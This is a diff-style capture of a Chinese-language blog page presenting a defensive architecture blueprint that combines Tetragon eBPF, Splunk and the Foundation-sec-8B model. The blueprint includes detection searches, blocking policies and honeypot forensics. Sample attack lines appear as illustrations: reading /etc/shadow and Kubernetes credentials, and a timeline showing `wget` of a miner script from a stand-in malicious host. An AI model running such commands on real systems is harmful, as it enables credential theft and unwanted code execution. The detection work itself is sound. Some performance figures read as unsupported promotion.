+| <span class="function">eval</span> risk_score = if(count > 1, 100, 50)
+| <span class="function">collect</span> index=risk_summary marker="detect_reverse_shell"</div>
+            </div>
+        </div>
+
+        <div class="grid-3" style="margin-top: 20px;">
+            <div class="card green">
+                <h4>Data Normalization (CIM)</h4>
+                <p>将 Tetragon 的字段映射到 Splunk CIM (Common Information Model)。<br><code>process_exec.binary</code> -> <code>process_name</code><br><code>process_sock.ip</code> -> <code>dest_ip</code></p>
+            </div>
+            <div class="card purple">
+                <h4>Adaptive Response</h4>
+                <p>当 `risk_score > 80` 时，Splunk 触发 Alert Action，调用 LLM API 进行二次研判，而非直接告警，减少 Noise。</p>
+            </div>
+            <div class="card navy">
+                <h4>Performance Metrics</h4>
+                <div class="grid-2">
+                    <div style="text-align: center;">
+                        <h2 style="border:none; color: white;">50k</h2>
+                        <small style="color: #ccc;">EPS (Events/Sec)</small>
+                    </div>
+                    <div style="text-align: center;">
+                        <h2 style="border:none; color: white;">&lt;2s</h2>
+                        <small style="color: #ccc;">Indexing Latency</small>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="page-number">Page 3 of 7</div>
+        <div class="page-author">Author: Weibo Rao Generated through Gemini Canvas</div>
+    </div>
+
+    <!-- PAGE 4: Foundation Model -->
+    <div class="page-container">
+        <div class="header-strip">
+            <div class="logo-area">SEC<span>ARCH</span> / 2025</div>
+            <div><h3>04. 技术深潜 - Foundation-sec-8B (The Brain)</h3></div>
+        </div>
+
+        <div class="grid-2" style="grid-template-columns: 1fr 1.5fr;">
+            <div>
+                <h3>模型概览 (Model Profile)</h3>
+                <table style="margin-top: 10px;">
+                    <tr><td><strong>Base Model</strong></td><td>Llama 3 / Mistral 架构</td></tr>
+                    <tr><td><strong>Parameters</strong></td><td>8 Billion (FP16/INT8)</td></tr>
+                    <tr><td><strong>Fine-tuning</strong></td><td>SecInstruct Dataset (CVE, ATT&CK, Splunk Docs, Tetragon CRDs)</td></tr>
+                    <tr><td><strong>Context</strong></td><td>32k Tokens (足够容纳长日志序列)</td></tr>
+                </table>
+                <br>
+                <h3>RAG 机制 (Retrieval-Augmented Generation)</h3>
+                <p>为了防止 AI 幻觉，我们集成了 RAG。模型在决策前，会查询内部知识库：</p>
+                <ol style="margin-left: 20px; font-size: 9pt; line-height: 1.5;">
+                    <li><strong>Vector DB:</strong> 存储历史 Incident Report。</li>
+                    <li><strong>Live Context:</strong> 查询 Splunk 最近 5 分钟的相关日志。</li>
+                </ol>
+            </div>
+            
+            <div class="card purple">
+                <h3>交互示例：自动研判与策略生成</h3>
+                <div style="background: white; padding: 10px; border-radius: 4px; border: 1px solid #ddd; margin-bottom: 10px;">
+                    <strong>Input (From Splunk Alert):</strong><br>
+                    <span style="font-family: monospace; font-size: 8pt; color: #555;">
+                    Alert: High Privileged File Read<br>
+                    Process: /usr/bin/cat<br>
+                    File: /etc/kubernetes/admin.conf<br>
+                    User: www-data (uid=33)<br>
+                    Parent: nginx worker process
+                    </span>
+                </div>
+                
+                <div style="background: #F3E5F5; padding: 10px; border-radius: 4px; border: 1px solid #9232ac;">
+                    <strong>Output (Foundation-sec-8B):</strong><br>
+                    <span style="font-size: 9pt;">
+                    <strong>[Analysis]:</strong> CRITICAL. Web server user `www-data` attempting to read Kubernetes admin credentials. Highly indicative of remote code execution (RCE) and post-exploitation.<br>
+                    <strong>[Action]:</strong> Isolate Pod immediately.<br>
+                    <strong>[Tetragon Policy Generated]:</strong>
+                    </span>
+                    <div class="code-block" style="margin-top: 5px; font-size: 8pt; margin-bottom: 0;">
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: "block-nginx-k8s-read"
+spec:
+  kprobes:
+  - call: "sys_openat"
+    ... (matches /etc/kubernetes/*) ...
+    action: Sigkill</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid-3" style="margin-top: 20px;">
+            <div class="card">
+                <h4>Step 1: Ingestion</h4>
+                <p>接收 Splunk 告警 payload。</p>
+            </div>
+            <div class="card">
+                <h4>Step 2: Reasoning</h4>
+                <p>结合 Threat Intel 进行推理，判断是否误报。</p>
+            </div>
+            <div class="card">
+                <h4>Step 3: Response</h4>
+                <p>生成具体的 YAML 策略或 CLI 命令。</p>
+            </div>
+        </div>
+
+        <div class="page-number">Page 4 of 7</div>
+        <div class="page-author">Author: Weibo Rao Generated through Gemini Canvas</div>
+    </div>
+
+    <!-- PAGE 5: Scenario 1 -->
+    <div class="page-container">
+        <div class="header-strip">
+            <div class="logo-area">SEC<span>ARCH</span> / 2025</div>
+            <div><h3>05. 场景一：主机敏感文件读取闭环</h3></div>
+        </div>
+
+        <h3>场景描述</h3>
+        <p>攻击者利用 Web 应用漏洞 (如 Log4j) 尝试读取 `/etc/shadow` 或 `/root/.ssh/id_rsa`。这是典型的权限提升或凭证窃取尝试。</p>
+
+        <div class="diagram-container" style="height: 160px; margin-top: 20px;">
+            <svg width="700" height="150" viewBox="0 0 700 150">
+                <line x1="50" y1="120" x2="650" y2="120" stroke="#ccc" stroke-width="2"/>
+                
+                <!-- Events -->
+                <circle cx="100" cy="120" r="5" fill="#e74c3c"/>
+                <text x="100" y="140" text-anchor="middle" font-size="10">T0: syscall openat</text>
+                
+                <circle cx="200" cy="120" r="5" fill="#00BCEB"/>
+                <text x="200" y="140" text-anchor="middle" font-size="10">T+1ms: Tetragon Block</text>
+
+                <circle cx="350" cy="120" r="5" fill="#25C266"/>
+                <text x="350" y="140" text-anchor="middle" font-size="10">T+50ms: Splunk Logged</text>
+
+                <circle cx="550" cy="120" r="5" fill="#9232ac"/>
+                <text x="550" y="140" text-anchor="middle" font-size="10">T+2s: AI Analysis Complete</text>
+
+                <!-- Annotation -->
+                <rect x="150" y="30" width="100" height="40" rx="5" fill="#e74c3c" opacity="0.2"/>
+                <text x="200" y="55" text-anchor="middle" fill="#c0392b" font-weight="bold">Zero Dwell Time</text>
+                <path d="M 200 70 L 200 110" stroke="#c0392b" stroke-dasharray="4"/>
+            </svg>
+        </div>
+
+        <h3>传统架构 vs IDPR 闭环架构</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>指标 (Metric)</th>
+                    <th>传统 EDR/SIEM 方案</th>
+                    <th>基于 eBPF + AI 方案</th>
+                    <th>提升幅度</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>检测位置</strong></td>
+                    <td>用户态日志 / 审计日志</td>
+                    <td><span class="badge bg-blue">内核态</span> Kprobe/Tracepoint</td>
+                    <td>不可绕过性提升</td>
+                </tr>
+                <tr>
+                    <td><strong>MTTD (平均检测时间)</strong></td>
+                    <td>分钟级 (依赖日志轮询)</td>
+                    <td>微秒/毫秒级 (事件驱动)</td>
+                    <td>1000x Faster</td>
+                </tr>
+                <tr>
+                    <td><strong>MTTR (平均响应时间)</strong></td>
+                    <td>小时级 (人工研判+封禁)</td>
+                    <td>秒级 (AI 自动下发策略)</td>
+                    <td>全自动闭环</td>
+                </tr>
+                <tr>
+                    <td><strong>CPU 开销</strong></td>
+                    <td>5% - 15% (Agent 繁重)</td>
+                    <td>&lt; 1% (eBPF JIT)</td>
+                    <td>资源占用极低</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="grid-2" style="margin-top: 20px;">
+            <div class="card navy">
+                <h4>攻击视角 (Attacker View)</h4>
+                <div class="code-block" style="background: black; color: #0f0;">
+$ cat /etc/shadow
+Killed
+$ whoami
+root
+$ # 进程被直接杀掉，没有任何回显
+$ # 攻击者无法判断是被安全软件拦截还是系统故障</div>
+            </div>
+            <div class="card">
+                <h4>防御视角 (Splunk Log)</h4>
+                <p>Tetragon 记录了完整的调用链：<br>
+                <code>parent: java (Log4j)</code> -> <code>child: bash</code> -> <code>exec: cat /etc/shadow</code>。<br>
+                <span class="badge bg-green">Action: SIGKILL</span> 字段确认威胁已阻断。</p>
+            </div>
+        </div>
+
+        <div class="page-number">Page 5 of 7</div>
+        <div class="page-author">Author: Weibo Rao Generated through Gemini Canvas</div>
+    </div>
+
+    <!-- PAGE 6: Scenario 2 -->
+    <div class="page-container">
+        <div class="header-strip">
+            <div class="logo-area">SEC<span>ARCH</span> / 2025</div>
+            <div><h3>06. 场景二：内网蜜罐与“幽灵录制”</h3></div>
+        </div>
+
+        <div class="grid-2">
+            <div>
+                <h3>概念：Ghost Recording (幽灵录制)</h3>
+                <p>在内网部署高交互蜜罐时，攻击者往往会尝试删除 bash history 或禁用 syslog。使用 eBPF，监控逻辑下沉至内核，攻击者在用户态的任何清理痕迹的操作都是徒劳的。</p>
+                <p><strong>核心能力：</strong></p>
+                <ul style="padding-left: 20px; line-height: 1.8;">
+                    <li><strong>按键记录：</strong> 监控 TTY 读写，即使用户使用 SSH 加密，内核也能看到明文输入。</li>
+                    <li><strong>文件还原：</strong> 攻击者下载的 Malware 即使被立即删除，Tetragon 也能通过拦截 `write` 系统调用还原文件内容。</li>
+                </ul>
+            </div>
+            <div class="card purple">
+                <h3>Splunk + AI 归因分析</h3>
+                <p>Splunk 收集所有“幽灵数据”，AI 模型进行攻击者画像：</p>
+                <ul style="font-size: 9pt;">
+                    <li><strong>工具指纹：</strong> 识别使用的 C2 工具（如 Cobalt Strike, Slyver）。</li>
+                    <li><strong>行为习惯：</strong> 输入命令的速度、拼写错误习惯、常用参数。</li>
+                </ul>
+            </div>
+        </div>
+
+        <h4 style="margin-top: 20px;">数据流转图：从内核到取证 (From Kernel to Forensics)</h4>
+        <div class="diagram-container" style="height: 200px;">
+            <svg width="700" height="200" viewBox="0 0 700 200">
+                <!-- Layers -->
+                <rect x="50" y="10" width="600" height="40" fill="#ddd" rx="5"/>
+                <text x="350" y="35" text-anchor="middle">Attacker (SSH Session / TTY)</text>
+
+                <rect x="50" y="70" width="600" height="40" fill="#1B252E" rx="5"/>
+                <text x="350" y="95" text-anchor="middle" fill="white">Linux Kernel (eBPF Hooks: read/write/connect)</text>
+
+                <rect x="50" y="140" width="180" height="50" fill="#00BCEB" rx="5"/>
+                <text x="140" y="170" text-anchor="middle" fill="white">Tetragon RingBuf</text>
+
+                <rect x="260" y="140" width="180" height="50" fill="#25C266" rx="5"/>
+                <text x="350" y="170" text-anchor="middle" fill="white">Splunk Replay</text>
+
+                <rect x="470" y="140" width="180" height="50" fill="#9232ac" rx="5"/>
+                <text x="560" y="170" text-anchor="middle" fill="white">AI Report Gen</text>
+
+                <!-- Arrows -->
+                <path d="M 350 50 L 350 70" stroke="#333" stroke-width="2" marker-end="url(#arrow)"/>
+                <path d="M 140 110 L 140 140" stroke="#333" stroke-width="2" marker-end="url(#arrow)"/>
+                <path d="M 230 165 L 260 165" stroke="#333" stroke-width="2" marker-end="url(#arrow)"/>
+                <path d="M 440 165 L 470 165" stroke="#333" stroke-width="2" marker-end="url(#arrow)"/>
+            </svg>
+        </div>
+
+        <div class="code-block">
+# AI 生成的取证摘要 (Forensics Summary)
+> <span class="keyword">Attacker Profile:</span> Script Kiddie using automated tools.
+> <span class="keyword">Timeline:</span>
+  10:01:05 - Initial Access via SSH (Weak Password)
+  10:01:10 - `wget http://malicious.site/miner.sh` (File Hash: e3b0c44...)
+  10:01:15 - `chmod +x miner.sh`
+  10:01:16 - Execution Blocked by Tetragon (Policy: block-unknown-binary)
+> <span class="keyword">Recommendation:</span> Rotate root credentials, enforce key-based auth.</div>
+
+        <div class="page-number">Page 6 of 7</div>
+        <div class="page-author">Author: Weibo Rao Generated through Gemini Canvas</div>
+    </div>
+
+    <!-- PAGE 7: Summary -->
+    <div class="page-container">
+        <div class="header-strip">
+            <div class="logo-area">SEC<span>ARCH</span> / 2025</div>
+            <div><h3>07. 场景三 & 总结 (Summary)</h3></div>
+        </div>
+
+        <div class="grid-2">
+            <div>
+                <h3>场景三：供应链软件基线漂移检测</h3>
+                <p>在零信任环境中，应用容器启动后的行为应该是确定的。Tetragon 可以实施<strong>应用基线 (Application Profiling)</strong>。</p>
+                <p><strong>检测逻辑：</strong></p>
+                <ul style="font-size: 9pt;">
+                    <li><strong>建立基线：</strong> 在测试环境运行应用，Splunk 记录所有合法的 Syscalls 和网络连接。</li>
+                    <li><strong>漂移告警：</strong> 生产环境中，一旦出现未在基线中的行为（如 Nginx 突然执行 `connect` 连向公网 IP，或加载未知 `.so` 库），Tetragon 立即标记并阻断。</li>
+                    <li><strong>供应链价值：</strong> 即使上游镜像被植入后门，只要后门触发了基线外的行为，就会被捕获。</li>
+                </ul>
+            </div>
+            <div class="card green">
+                <h4>IDPR 化学反应 (The "Chemical Reaction")</h4>
+                <p>三者的结合产生了 1+1+1 > 3 的效果：</p>
+                <ul style="font-size: 9pt; margin-top: 10px;">
+                    <li><strong>Tetragon</strong> 提供了以前无法获得的深层数据（Fuel）。</li>
+                    <li><strong>Splunk</strong> 提供了关联这些数据的上下文环境（Engine）。</li>
+                    <li><strong>Foundation-sec-8B</strong> 提供了实时处理这些数据的智能（Driver）。</li>
+                </ul>
+            </div>
+        </div>
+
+        <h3 style="margin-top: 25px;">总结：IDPR 闭环优势矩阵</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>维度</th>
+                    <th>Next-Gen (本架构)</th>
+                    <th>Legacy (传统架构)</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>数据深度</strong></td>
+                    <td>Syscall, Kernel Function Arguments, Network Socket State</td>
+                    <td>Syslog, WinEventLog, NetFlow (Sampled)</td>
+                </tr>
+                <tr>
+                    <td><strong>响应速度</strong></td>
+                    <td>Inline Blocking (同步阻断)</td>
+                    <td>Async Response (异步响应，有时间差)</td>
+                </tr>
+                <tr>
+                    <td><strong>运维成本</strong></td>
+                    <td>LLM 辅助分析，减少 Tier-1 SOC 压力</td>
+                    <td>海量告警疲劳，依赖高级专家人工分析</td>
+                </tr>
+                <tr>
+                    <td><strong>适应性</strong></td>
+                    <td>基于行为与意图 (Behavioral)</td>
+                    <td>基于特征码与规则 (Signature Based)</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="card navy" style="margin-top: 20px; text-align: center; color: white;">
+            <p style="color: white; font-size: 12pt; margin: 0;"><strong>"Visibility is the prerequisite for security. Intelligence is the key to efficiency."</strong></p>
+            <small>-- Next-Gen Security Architecture Blueprint v1.0</small>
+        </div>
+
+        <div class="page-number">Page 7 of 7</div>
+        <div class="page-author">Author: Weibo Rao Generated through Gemini Canvas</div>
+    </div>
+
+</body>
+</html>
+      </div>
+      
+      
+      
+    </div>
+
+    
+    
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2021 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Rao Weibo</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">65k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:55</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/weiborao" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
